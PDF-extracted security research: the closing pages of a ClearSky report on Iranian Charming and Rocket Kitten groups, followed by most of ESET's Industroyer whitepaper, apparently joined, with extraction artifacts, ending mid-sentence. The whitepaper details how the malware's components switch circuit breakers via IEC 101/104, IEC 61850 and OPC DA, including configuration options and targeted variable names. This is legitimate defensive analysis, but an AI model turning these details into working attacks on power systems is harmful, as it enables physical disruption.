\nc7760dc8f7baf67f80ab549af27df9e9\n \nc96453247ee1ecbd4053da8bbb4cf572\n \nccaf21e122ca9d2e2397a9e28eb4cc87\n \nd6ea39e1d4aaa8c977a835e72d0975e3\n \nd6fa439f0278babb1edff32d8dc31c59\n \nda1f6a5f2a5564c2131b4a311c55f487\n \ne7dd9b8fe7ae14faad304d139f71b629\n \ne93992f26f224ea53d9bdd9564e8e1c0\n \nedd4011696ddd349575278aed7031a47\n \nf5763b8b796b1c5d04febcc65f853967\n \nf7f9806af42adb80d100e55f35cfa86c\n \nf9255e0d492eb20df1e78ccc970b121a\n \nfac158623b0e3ed3bea6e24b1795cb95\n \n479e1e02d379ad6c3c7f496d7\n05448fa955b50a1\n \n67bb83bbe82ffa910386216619c5ebf9eecf13e6\n \n6cacf83033fa97f4ac27eb27e4aa265afa4dc51d\n \na2f17906ca39e7f41a8adeea4be5ffb7d1465c4a\n \nc5ea8680162d3e8bc3d71c060c15bf224c873f7a\n \nd97b13ed0fe3e41b60b9d45b6e7f68c9b6187b96\n \neac4a47f238ee62661f464a807b3e0b5079\nb835f\n \necf9b7283fda023fa37ad7fdb15be4eadded4e06\n \n19c0977fdbc221f7d6567fb268a4ef4cd2a759fcbc1\n039a82366978089f080d2\n \n1a24714fd99030bd63804ab96fc2612f148a5f08d1\nc2845152c3a0e168600db9\n \n261c5f32abb8801576ce81be2c66bca564a8a28ab\n5ea0954bad6bac7071e299b\n \n2c92da2721466b\nfbdaff7fedd9f3e8334b688a88ee\n54d7cab491e1a9df41258f\n \n2db1e2c49ff0792b54d84538c9a420de7aa619602\nb66add502e2b6ea7c79fd4b\n \n4fff9cd7f5f4c9048cfaf958a54cc4c4bc14c9fdbfd63\ne2c17f79913f0ea8c21\n \n6618051ea0c45d667c9d9594d676bc1f4adadd8cb\n30e0138489fee05ce91a9cb\n \n8aff94ceb2\nfed8ba864df929fbbec3dd82cbd968c5\nb2f42971fb756d1ba1ecb6\n \na86ccf0049be20c105e2c087079f18098c739b86d5\n2acb13f1d41f1ccc9f8e1c\n \n  \nPage \n58\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nacca9f004a596ea33af65725c2319bf845a442ee9fa\n09c511d359df2f632cf4d\n \nb0b177d06fb987429f01d937aaa1cbb7c93a69cfae\nf146b60f618f8ab26fac38\n \nd4375a\n22c0f3fb36ab788c0a9d6e0479bd19f48349\nf6e192b10d83047a74c9d7\n \nd7e1d13cab1bd8be1f00afbec993176cc116c2b233\n209ea6bd33e6a9b1ec7a7f\n \nd7f2b4188b7c30c1ef9c075891329dbcf8e9b5ebac\n1ef8759bc3bb2cf68c586f\n \nd84e808e7d19a86bea3862710cae1c45f7291e984\nc9857d0c86881812674d4bb\n \ne6cd39cf0af6a0b7d8129bf6400e671d5fd2a3797b\n92e0fe4a8e93f3de46b716\n \n \n  \nPage \n59\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nAppendix\n \nB \n-\n \nPrevious reports about \nCharming Kitten \nand Rocket Kitten\n \nRocket Kitten:\n \n\n \nrocket kitten: a campaign with 9 lives \n-\n \nCheck Point Blog\n38\n \n\n \nLONDON CALLIN\nG Two\n-\nFactor Authentication Phishing From Iran\n39\n \n\n \nThamar Reservoir \n\n \nAn Iranian cyber\n-\nattack campaign against targets in the Middle East\n40\n \n\n \nRocket Kitten Showing Its Claws: Operation Woolen\n-\nGoldFish and the GHOLE campaign\n41\n \n\n \nThe Kittens Strike Back: Rocket \nKitten Continues Attacks on Middle East Targets\n42\n \n\n \nIncreased Use of Android Malware Targeting Journalists\n43\n \n\n \nIran and the So\nft War for Internet Dominance\n44\n \nCharming Kitten:\n \n\n \niKittens: Iranian Actor Resurfaces with Malware for Mac (MacDownloader)\n45\n \n\n \nFictitious Prof\n\n46\n \n\n \nFreezer Paper around Free Meat\n47\n \n                                        \n                  \n \n38\n \nhttps://blog.checkpoint.com/wp\n-\ncontent/uploads/2015/11/rocket\n-\nkit\nten\n-\nreport.pdf\n \n \n39\n \nhttps://citizenlab.ca/2015/08/iran_two_factor_phishing/\n \n \n40\n \nhttp://www.clearskysec.com/thamar\n-\nreservoir/\n \n \n41\nhttps://www.trendmicro.com/vinfo/us/security/news/cyber\n-\nattacks/operation\n-\nwoolen\n-\ngoldfish\n-\nwhen\n-\nkittens\n-\ngo\n-\nphishing\n \n \n42\n \nhttps://www.trendmicro.com/vinfo/us/security/news/cyber\n-\nattacks/rocket\n-\nkitten\n-\ncontinues\n-\nattacks\n-\non\n-\nmiddle\n-\neast\n-\ntargets\n\n \n43\n \nhttps://iranthreats.github.io/resources/android\n-\nmalware/\n \n \n44\n \nht\ntps://iranthreats.github.io/us\n-\n16\n-\nGuarnieri\n-\nAnderson\n-\nIran\n-\nAnd\n-\nThe\n-\nSoft\n-\nWar\n-\nFor\n-\nInternet\n-\nDominance\n-\npaper.pdf\n \n \n45\n \nhttps://iranthreats.github.io/resources/macdownloader\n-\nmacos\n-\nmalware/\n \n \n46\n \nhttps://iranthreats.github.io/resources/webrtc\n-\ndeanonymization/\n \n \n47\n \nhttps://securelist.com/freezer\n-\npaper\n-\naround\n-\nfree\n-\nmeat/74503/\n \n \n ", "WIN32/INDUSTROYER\nA new threat for\n \nindustrial control systems\nAnton Cherepanov, ESET\nVersion 2017-06-12\n 1\nContents\nWin32/Industroyer: a new threat for industrial control systems\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n2\nMain backdoor\n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n3\nAdditional backdoor\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n4\nLauncher component\n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n5\n101 payload component\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n6\n104 payload component\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n7\n61850 payload component\n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n .\n10\nOPC DA payload component\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n. \n12\nData wiper component\n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n13\nAdditional tools: port scanner tool\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n. \n14\nAdditional tools: DoS tool\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n. \n15\nConclusion\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n. \n15\nIndicators of Compromise (IoC)\n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n \n.\n15\n 2\nWin32/Industroyer: a new threat for \nindustrial control systems\nWin32/Industroyer is a sophisticated piece of malware designed to disrupt \nthe working processes of industrial control systems (ICS), speci\u02dccally \n\nindustrial control systems used in electrical substations\n.\nThose behind the Win32/Industroyer malware have a deep knowledge \nand understanding of industrial control systems and, speci\u02dccally, the \n\nindustrial protocols used in electric power systems\n.\n Moreover, it seems very \n\nunlikely anyone could write and test such malware without access to the \n\nspecialized equipment used in the speci\u02dcc, targeted industrial environment\n.\nSupport for four di\u02daerent industrial control protocols, speci\u02dced in the \nstandards listed below, has been implemented by the malware authors:\n\u0141\n \nIEC 60870-5-101 (aka IEC 101)\n\u0141\n \nIEC 60870-5-104 (aka IEC 104)\n\u0141\n \nIEC 61850\n\u0141\n \nOLE for Process Control Data Access (OPC DA)\nIn addition to all that, the malware authors also wrote a tool that \nimplements a denial-of-service (DoS) attack against a particular family of \n\nprotection relays, speci\u02dccally the \nSiemens SIPROTEC\n range\n.\nAll this considered, the Win32/Industroyer malware authors show an \nintensive focus that suggests they are highly specialized in industrial \n\ncontrol systems\n.\nThe capabilities of this malware are signi\u02dccant\n.\n When compared to the \ntoolset used by threat actors in the 2015 attacks against the Ukrainian \n\npower grid which culminated in a black out on December 23, 2015 \n\n(BlackEnergy, KillDisk, and other components, including legitimate \n\nremote access software) the gang behind Industroyer are more advanced, \n\nsince they went to great lengths to create malware capable of directly \n\ncontrolling switches and circuit breakers\n.\n We have seen indications that \nthis malware could have been the tool used by attackers to cause the \n\npower outage in Ukraine in December 2016, although at the time of \n\nwriting, it is not con\u02dcrmed, and the investigation is still ongoing\n.\n The \n\ninfection vector remains unknown\n.\nThe malware contains multiple modules, as analyzed and described in the \nnext sections of this whitepaper\n.\n However, before diving into those details, \nthe following simpli\u02dced schematic shows the connections between the \n\ncomponents of the malware\n.\nFigure 1\n.\n Simpli\u02dced schematic of Win32/Industroyer components\n.\nWhile some components (e\n.\ng\n.\n Data wiper) are similar in concept to the \n2015 \n\nBlackEnergy attacks\n against power grid companies in Ukraine, we don\u2122t see \n\nany link between those attacks and the code in this malware\n.\n 3\nMain backdoor\nWe refer to the core component of Industroyer as the main backdoor\n.\n The \nmain backdoor is used by the attackers behind Industroyer to control all \nother components of the malware\n.\nAs backdoors go, this component is pretty straightforward, connecting \nto its remote C&C server using HTTPS and receiving commands from \n\nthe attackers\n.\n All analyzed samples are hardcoded to use the same proxy \n\naddress, located in the local network\n.\n Thus, the backdoor is clearly designed \n\nto work only in one speci\u02dcc organization\n.\n It is also worth mentioning that \n\nmost of the C&C servers used by this backdoor are running Tor software\n.\nPerhaps the most interesting feature of this backdoor is that attackers \ncan de\u02dcne a speci\u02dcc hour of the day when the backdoor will be active\n.\n \nFor example, the attackers can modify the backdoor in this way so it will \n\ncommunicate with its C&C server only outside working hours\n.\n This can make \n\ndetection based only on network tra\u02dbc examination harder\n.\n However, all the \nsamples analyzed so far are set to work 24 hours round the clock\n.\nFigure 2\n.\n The decompiled main backdoor code has a check for time-of-day\n.\nOnce connected to its remote C&C server, the main backdoor component \n\nsends the following data in a POST-request:\n\u0141\n \nthe globally unique identi\u02dcer (GUID) string for the current hardware \npro\u02dcle retrieved via \n\u0141\n \nthe version of the malware: 1\n.\n1e\n\u0141\n \nthe hardcoded ID of the sample\n\u0141\n \nthe result of any previously-received command\nThe hardcoded ID is used by the attacker as an identi\u02dcer for the infected \n\nmachine\n.\n Across all analyzed samples we found the following hardcoded ID \n\nvalues:\n\u0141\n \nDEF\n\u0141\n \nDEF-C\n\u0141\n \nDEF-WS\n\u0141\n \nDEF-EP\n\u0141\n \nDC-2-TEMP\n\u0141\n \nDC-2\n\u0141\n \nCES-McA-TEMP\n\u0141\n \nCES\n\u0141\n \nSRV_WSUS\n\u0141\n \nSRV_DC-2\n\u0141\n \nSCE-WSUS01\nThe main backdoor component supports the following commands:\nCommand ID\nPurpose\n0\nExecute a process\n1\nExecute a process under a speci\u02dcc user account\n.\n \nCredentials for the account are supplied by the \n\nattacker\n2\nDownload a \u02dcle from C&C server\n3\nCopy a \u02dcle\n 4\nCommand ID\nPurpose\n4\nExecute a shell command\n5\nExecute a shell command under a speci\u02dcc user \naccount\n.\n Credentials for the account are supplied \n \n\nby the attacker\n6\nQuit\n7\nStop a service\n8\nStop a service under a speci\u02dcc user account\n.\n \n\nCredentials for the account are supplied by \n\nthe\u02ddattacker\n9\nStart a service under a speci\u02dcc user account\n.\n \n\nCredentials for the account are supplied by \n\nthe\u02ddattacker\n10\nReplace \"Image path\" registry value for a service\nOnce the attackers obtain administrator privileges, they can upgrade \n\nthe installed backdoor to a more privileged version that is executed as \n\na \nWindows service program\n.\n To do this they pick an existing, non-critical \n\nWindows service and replace its \nImagePath\n registry value with the path of \nthe new backdoor\u2122s binary\n.\nThe functionality of the main backdoor that works as a Windows service \nis the same as just described\n.\n However, there are two small di\u02daerences: \n\n\u02dcrst the backdoor\u2122s version is 1\n.\n1s, instead of 1\n.\n1e, and second, there is code \n\nobfuscation\n.\n The code of this version of the backdoor is mixed with junk \n\nassembly instructions\n.\nFigure 3\n.\n The obfuscated assembly code of the main backdoor that works as \n \na Windows service\n.\nAdditional backdoor\nThe additional backdoor provides an alternative persistence mechanism \n\nthat allows the attackers to regain access to a targeted network in case the \n\nmain backdoor is detected and/or disabled\n.\nThis backdoor is a trojanized version of the Windows Notepad application\n.\n \nThis is a fully functional version of the application, but the malware authors \n\nhave inserted malicious code that is executed each time the application is \n\nlaunched\n.\n Once the attackers gain administrator privileges, they are able to \n\nreplace the legitimate Notepad manually\n.\nThe inserted malicious code is heavily obfuscated, but once the code is \ndecrypted it connects to a remote C&C server, which is di\u02daerent to the one \n\nlinked in the main backdoor, and downloads a payload\n.\n This is in the form \n 5\nof shellcode that is loaded directly into memory and executed\n.\n In addition, \nthe inserted code decrypts the original Windows Notepad code, which \n\nis stored at the end of the \u02dcle, and then passes execution to it\n.\n Thus, the \n\nNotepad application works as expected\n.\nFigure 4\n.\n Comparison between original Notepad binary code (at the left) \n \nand backdoored binary code\n.\nLauncher component\nThis component is a separate executable responsible for launching the \n\npayloads and the Data wiper component\n.\nThe Launcher component contains a speci\u02dcc time and date\n.\n Analyzed \nsamples contained two dates, 17\nth\n December 2016 and 20\nth\n December 2016\n.\n \nOnce one of these dates is reached the component creates two threads\n.\n \n\nThe \u02dcrst thread makes attempts to load a payload DLL, while the second \n\nthread waits one or two hours (it depends on the Launcher component \n\nversion) and then attempts to load the Data wiper component\n.\n The priority \n\nfor both threads is set to \nTHREAD_PRIORITY_HIGHEST\n, which means that \nthese two threads receive a higher than normal share of CPU resources \n\nfrom the operating system\n.\nThe name of the payload DLL is supplied by the attackers via a command \nline parameter supplied in one of the main backdoor\u2122s \ufb01execute a shell \n\ncommand\ufb02 commands\n.\n The Data wiper component is always named  \n\n\n.\n The expected command lines are of the form:\nEach argument on the command line represents the following:\n\u0141\n \n is the \u02dclename of the Launcher component\n\u0141\n \n is the directory where the payload DLL and \ncon\u02dcguration is stored\n\u0141\n \n is the \u02dclename of the payload DLL\n\u0141\n \n is the \u02dcle that stores con\u02dcguration data for the \nspeci\u02dced payload\n.\n The path to this \u02dcle is supplied to the payload DLL by \nthe Launcher component\nThe payload and Data wiper components are standard Windows DLL \u02dcles\n.\n \n\nIn order to be loaded by the Launcher component they must export a \n\nfunction named \nCrash\n as seen in Figure 5\n.\n 6\nFigure 5\n.\n Example payload DLL that has internal name \n \n \nand \nCrash\n export function\n.\n101 payload component\nThis payload DLL has the \u02dclename \n and is named after IEC 101 (aka \nIEC 60870-5-101\n), an international standard that describes a protocol for \nmonitoring and controlling electric power systems\n.\n The protocol is used for \n\ncommunication between industrial control systems and Remote Terminal \n\nUnits (RTUs)\n.\n The actual communication is transmitted through a serial \n\nconnection\n.\nThe 101 payload component partly implements the protocol described in \nthe IEC 101 standard and is able to communicate with an RTU or any other \n\ndevice with support for that protocol\n.\nOnce executed, the 101 payload component parses the con\u02dcguration stored \nin its INI \u02dcle\n.\n The con\u02dcguration may contain several entries: process name, \nWindows device names (usually COM ports), the number of Information \n\nObject Address (IOA) ranges, and the beginning and ending IOA values \n\nfor the speci\u02dced number of IOA ranges\n.\n IOA is a number that identi\u02dces \n\na particular data element in the device\n.\n Figure 6 illustrates a 101 payload \n\ncon\u02dcguration \u02dcle with two de\u02dcned IOA ranges, 10-15 and 20-25\n.\nFigure 6\n.\n An example of a 101 payload DLL con\u02dcguration\n.\nThe name of the process speci\u02dced in the con\u02dcguration belongs to an \n\napplication the attackers suspect is running on the victim machine\n.\n It \n\nshould be the application the victim machine uses to communicate \n\nthrough serial connection with the RTU\n.\n The 101 payload attempts to \nterminate the speci\u02dced process and starts to communicate with the \n\nspeci\u02dced device, using the \n, \n and \n \nWindows API functions\n.\n The \u02dcrst COM port from the con\u02dcguration \u02dcle is \n\nused for the actual communication and the two other COM ports are just \n\nopened to prevent other processes accessing them\n.\n Thus, the 101 payload \n\ncomponent is able to take over and maintain control of the RTU device\n.\nThis component iterates through all IOAs in the de\u02dcned IOA ranges\n.\n \nFor each such IOA it constructs two \ufb01select and execute\ufb02 packets, one \nwith a single command (\nC_SC_NA_1\n) and one with a double command \n\n(\nC_DC_NA_1\n) and sends these to the RTU device\n.\n The main goal of the \ncomponent is to change the On/O\u02da state of single command type IOA \n 7\nand double command type IOA\n.\n Speci\u02dccally, the 101 payload has three \nstages: in the \u02dcrst stage this component attempts to switch IOAs to their \n\nO\u02da state, in the second stage it attempts to invert IOA states to On, and \n\nin the \u02dcnal stage the component switches IOA states to O\u02da again\n.\nFigure 7\n.\n  An example of a 101 payload packet, after being dissected in Kaitai Struct WebIDE\n.\n104 payload component\nThis payload DLL has the \u02dclename 104\n.\ndll and is named after IEC 104 (aka \n\nIEC 60870-5-104\n), an international standard\n.\n The IEC 104 protocol extends \n\nIEC 101, so the protocol can be transmitted over a TCP/IP network\n.\nDue to its highly con\u02dcgurable nature, this payload can be customized \nby the attackers for di\u02daerent infrastructures\n.\n Figure 8 shows what a \n\ncon\u02dcguration \u02dcle may look like\n.\nFigure 8\n.\n An example of 104 payload DLL con\u02dcguration\n.\nOnce executed, the 104 payload DLL attempts to read its con\u02dcguration \u02dcle\n.\n \n\nAs described above, the path for the con\u02dcguration \u02dcle is supplied by the \n\nLauncher component\n.\nThe con\u02dcguration contains a \nSTATION\n section followed by properties \nthat con\u02dcgure how the 104 payload should work\n.\n The con\u02dcguration may \ncontain multiple \nSTATION\n entries\n.\n 8\nOur analysis of this component reveals the following possible \n \ncon\u02dcguration properties:\nProperty\nExpected value\nPurpose\ntarget_ip\nIP address\nThe IP address that will be used \nfor the communication using IEC \n\n104 protocol standard\ntarget_port\nPort number\nSelf-explanatory\nuselog\n1 or 0\nEnables or disables logging \n \n\nto a \u02dcle\nlog\u02dcle\nFilename\nSpeci\u02dces the \u02dclename for the log, \n\nif enabled\nstop_comm_\n\nservice\n1 or 0\nEnables or disables termination of \n\nthe process\nstop_comm_\n\nservice_name\nProcess name\nSpeci\u02dces the process name that \n\nwill be terminated\ntimeout\nTimeout in \n\nmilliseconds\nSpeci\u02dces timeout between send \n\nand recv calls\n.\n Default value:  \n\n15000\nsocket_timeout\nTimeout in \n\nmilliseconds\nSpecify the receiving timeout\n.\n \n\nDefault value:  15000 \nsilence\n1 or 0\nEnables or disables console output\nasdu\nInteger\nSpeci\u02dces  ASDU (Application \n\nService Data Unit) address also \n\nknown as sector\n\u02dcrst_action\non or o\u02da\nSpeci\u02dces the Switch value in ASDU \n\npacket for \u02dcrst iteration\nchange\n1 or 0\nSpeci\u02dces that the Switch value in \n\nASDU packet should be inverted \n\nduring iterations\ncommand_type\ndef or short\n \n\nor long or persist\nSpeci\u02dces command pulse duration \n\nfor quali\u02dcer of command (QOC)\nProperty\nExpected value\nPurpose\noperation\nrange or \n\nsequence or shift\nSpeci\u02dces iteration type for \n\nInformation Object Addresses \n\n(IOA)\nrange\nSpeci\u02dcc format of \n\nIOAs\nSpeci\u02dces range of Information \n\nObject Addresses (IOA) \nsequence\nSpeci\u02dcc format of \n\nIOAs\nSpeci\u02dces sequence of Information \n\nObject Addresses (IOA)\nshift\nSpeci\u02dcc formatof \n\nIOAs\nSpeci\u02dces shift of Information \n\nObject Addresses (IOA)\nOnce the con\u02dcguration \u02dcle is read, the 104 payload creates a thread for \n\neach STATION section de\u02dcned in the con\u02dcguration \u02dcle\n.\n In each such \n\nthread, the 104 payload will attempt to communicate with the speci\u02dced \n\nIP address using the protocol described in the IEC 104 standard\n.\n Before the \n\nconnection is made, the 104 payload attempts to terminate the legitimate \n\nprocess that is normally responsible for IEC 104 communication with the \n\ndevice\n.\n It does so only if the \n property is speci\u02dced \nin its con\u02dcguration\n.\n By default, the 104 payload terminates the process \n\nnamed \n, or the process name speci\u02dced in its \ncon\u02dcguration\n.\nThe main idea behind the 104 payload is relatively simple\n.\n It connects to \nthe speci\u02dced IP address and starts to send packets with the ASDU address \n\nthat was de\u02dcned in its con\u02dcguration\n.\n The goal of this communication is to \n\ninteract with an IOA of a single command type\n.\nIn the con\u02dcguration \u02dcle, the attacker can de\u02dcne the \n property to \nspecify exactly how single command type IOAs will be iterated\n.\n\nThe \u02dcrst such \n mode is the \nrange\n mode\n.\n The attackers use \nthis mode in order to discover possible IOAs in the targeted device\n.\n The \nattackers have to take this approach because the protocol described in \n\nthe IEC 104 standard does not provide a speci\u02dcc method to obtain such \n\ninformation\n.\n 9\nThe \nrange\n mode has two stages\n.\n During the \u02dcrst stage, once the range of \nIOAs is obtained from the con\u02dcguration \u02dcle, the 104 payload connects to \n\nthe target IP address and starts to iterate through the speci\u02dced IOAs\n.\n To \n\neach such IOA the 104 payload sends \ufb01select and execute\ufb02 packets in order \n\nto switch the state and to con\u02dcrm whether the IOA belongs to the single \n\ncommand type\n.\nFigure 9\n.\n  An example of a 104 payload packet, after being dissected by Wireshark\n.\nOnce all possible IOAs from the speci\u02dced range are iterated, the 104 \n\npayload switches to the second stage of \nrange\n mode\n.\n If logging is enabled, \n\nthe payload writes \n to the log\n.\n The rest of this \nsecond stage is an in\u02dcnite loop that uses the previously discovered IOAs of \n\nsingle command type\n.\n In the loop the payload constantly sends \ufb01select and \n\nexecute\ufb02 packets\n.\n In addition, if the option change is de\u02dcned, the payload \n\n\u02d9ips the On/O\u02da state between loop steps\n.\nFigure 10 demonstrates the log \u02dcle that was produced by the 104 payload \nduring our analysis\n.\n It shows the payload iterated IOAs from 10 to 15, and \n\nonce IOAs of the single command type were discovered, the payload \n\nstarted to use them in the loop\n.\n The con\u02dcguration had the \nchange\n option \nenabled, so between loop iterations the payload \u02d9ipped the switch value \n\nfrom On to O\u02da and wrote it to the log\n.\nFigure 10\n.\n Example log \u02dcle produced by the 104 payload\nThe second \n mode is the \n mode\n.\n This is very similar to \nthe range mode\n.\n The attacker de\u02dcnes, in the con\u02dcguration \u02dcle, a range of \n\nIOAs and shift values\n.\n Once the 104 payload is activated it does everything \n\nthe same way as in \nrange\n mode; however, once all IOAs in the de\u02dcned \n\nrange are iterated, it starts to iterate over the new range\n.\n The new range is \n\ncalculated by adding the shift values to the default range values\n.\nThe third \n mode is the \nsequence\n mode\n.\n It can be used by \nattackers once they know the values of all IOAs of the single command \ntype that are supported by the connected device\n.\n This payload immediately \n 10\nexecutes an in\u02dcnite loop, sending \ufb01select and execute\ufb02 packets to the IOAs \nde\u02dcned in the con\u02dcguration \u02dcle\n.\nAside from its logging capability, the 104 payload can output debug \ninformation to the console, as seen in Figure 11\n.\nFigure 11\n.\n The console output of the 104 payload\n.\n61850 payload component\nUnlike the 101 and 104 payloads, this payload component exists as a \n\nstandalone malicious tool comprising an executable named \n \nand the \n.\n It is named after the \nIEC 61850\n standard\n.\n This \nstandard describes a protocol used for multivendor communication among \n\ndevices that perform protection, automation, metering, monitoring, and \n\ncontrol of electrical substation automation systems\n.\n The protocol is very \n\ncomplex and robust, but the 61850 payload uses only a small subset of the \n\nprotocol to produce its disruptive e\u02daect\n.\nOnce executed, the 61850 payload DLL attempts to read the con\u02dcguration \n\u02dcle, the path to which is supplied by the Launcher component\n.\n The \n\nstandalone version defaults to reading its con\u02dcguration from\n.\n The \ncon\u02dcguration \u02dcle is expected to contain a list of IP addresses of devices \n\ncapable of communicating via the protocol described in the IEC 61850 \n\nstandard\n.\nIf the con\u02dcguration \u02dcle is not present, then this component enumerates all \nconnected network adaptors to determine their TCP/IP subnet masks\n.\n The \n\n61850 payload then enumerates all possible IP addresses for each of these \n\nsubnet masks, and tries to connect to port 102 on each of those addresses\n.\n \n\nTherefore, this component has the ability to discover relevant devices in the \n\nnetwork automatically\n.\nOtherwise, if a con\u02dcguration \u02dcle is present and it contains target IP \naddresses, this component connects to port 102 on those IP addresses and \n\non IP addresses that were discovered automatically\n.\n \nOnce this component connects to a target host, it sends a Connection \nRequest packet using the Connection Oriented Transport Protocol, as seen \n\nin Figure 12\n.\n 11\nFigure 12\n.\n  A Connection Request packet, after dissection by Wireshark\n.\nIf the target device responds appropriately, the 61850 payload then sends \nan \n packet using the \nManufacturing Message Specification\n \n(MMS)\n.\n If the expected answer is received, it continues, sending an MMS \n\n request\n.\n Thereby, the component compiles a list of object \nnames in a Virtual Manufacturing Device (VMD)\n.\nNext, this component enumerates the objects discovered in the previous \nstep and sends the device domain-speci\u02dcc \n requests with \neach object name\n.\n This enumerates named variables in a speci\u02dcc domain\n.\nFigure 13\n.\n The dissected MMS \n request in Wireshark\n.\nAfterwards, the 61850 payload parses data received in response to these \n\nrequests, searching for variables that contain following combinations of \n\nstrings:\n\u0141\n \nCSW, CF, Pos, \nand\n Model\n\u0141\n \nCSW, ST, Pos, \nand\n stVal\n\u0141\n \nCSW, CO, Pos, Oper, \nbut not \n$T\n\u0141\n \nCSW, CO, Pos, SBO, \nbut not \n$T\nThe string CSW is a name for logical nodes, which are used to control \ncircuit breakers and switches\n.\nFor variables that contain the Model or stVal string the 61850 payload sends \nan additional MMS \n request\n.\n For some of the variables this component \n\nmay also issue an MMS \n request that will change its state\n.\n 12\nThe 61850 payload produces a log \u02dcle of its operations that contains the IP \naddresses, MMS domains, named variables and the node states (open or \n\nclosed) of its targets\n.\nOPC DA payload component\nThe OPC DA payload component implements a client for the protocol \n\ndescribed in the \nOPC Data Access\n speci\u02dccation\n.\n \nOPC (OLE for Process \n\nControl)\n is a software standard and speci\u02dccation that is based on Microsoft \n\ntechnologies such as OLE, COM, and DCOM\n.\n The Data Access (DA) part of \n\nthe OPC speci\u02dccation allows real-time data exchange between distributed \n\ncomponents, based on a client\u0152server model\n.\nThis component exists as a standalone malicious tool with the \u02dclename \n and a DLL, which implement both 61850 and OPC DA \npayload functionalities\n.\n This DLL is named, internally in PE export table, \n\n, suggesting that the code of this component may be \nbased on the open source project \nOPC Client\n.\nFigure 14\n.\n The PE export reveals the internal DLL name of the OPC DA payload\n.\nThe OPC DA payload does not require any kind of con\u02dcguration \u02dcle\n.\n \n\nOnce executed by the attacker, it enumerates all OPC servers using the \n\n method with \nCATID_\nOPCDAServer20\n category identi\u02dcer and \n to \nidentify the ones running\n.\nNext the component uses the \n \ninterface to enumerate all OPC items on the server\n.\n Speci\u02dccally, it looks for \nitems that contain the following strings in their name:\n\u0141\n \nctlSelOn\n\u0141\n \nctlOperOn\n\u0141\n \nctlSelO\u02da\n\u0141\n \nctlOperO\u02da\n\u0141\n \n\\Pos and stVal\nThe names of these items may suggest that attackers are interested in \nOPC items provided by OPC servers that belong to solutions from \nABB\n, \nsuch as their \nMicroSCADA range\n.\n Figure 15 demonstrates an example list of \n\nOPC items that contain names with similar strings\n.\n This list of OPC items is \n\nreceived by the OPC Process Objects List Tool from ABB\n.\nFigure 15\n.\n An example of OPC items names in IN \u02dceld received using \n \nOPC Process Objects List Tool\n.\n 13\nThe attackers use the string \n when they add a new OPC group\n.\n \nPossibly this string is used by the attackers as a slang term when referring \n\nto the ABB solutions\n.\nFigure 16\n.\n The disassembled code of the OPC DA component that uses the \n string\n.\nOn the \u02dcnal step, the OPC DA payload attempts to change the state of \n\ndiscovered OPC items using the \n interface by writing the 0x01 \nvalue twice\n.\nFigure 17\n.\n Disassembled code of OPC DA payload that uses \n interface\n.\nThe component writes the OPC server name, OPC item name state, quality \n\ncode and value to the log \u02dcle\n.\n The logged values are separated with the 